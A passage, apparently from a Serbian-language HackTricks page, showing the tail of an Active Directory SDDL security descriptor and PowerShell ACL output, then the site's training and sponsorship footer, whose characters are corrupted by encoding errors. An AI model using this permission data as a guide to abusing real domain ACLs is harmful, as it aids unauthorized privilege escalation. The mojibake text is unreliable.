-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)"
Vlasnik            : BUILTIN\Administrators
Grupa            : BUILTIN\Administrators
DiscretionaryAcl : {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT
AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions,
Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed
(CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,
WriteExtendedAttributes)...}
SystemAcl        : {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse),
BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), DOMAIN_NAME\Domain Users:
SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess
(Traverse)...}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
```
